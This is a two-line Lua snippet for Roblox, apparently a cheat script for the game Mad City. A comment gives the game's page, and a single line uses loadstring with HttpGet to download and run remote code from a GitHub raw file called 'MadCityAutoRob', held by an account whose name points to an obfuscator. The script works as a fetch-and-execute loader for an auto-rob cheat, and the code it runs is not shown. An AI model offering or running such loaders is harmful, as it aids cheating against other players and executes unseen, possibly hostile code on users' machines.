-- https://www.roblox.com/games/1224212277/Mad-City-NEW-VIP-SERVER-COMMANDS

loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisUsernameWasObfuscatedUsingPSUObf40A/Scripts/main/MadCityAutoRob"))()
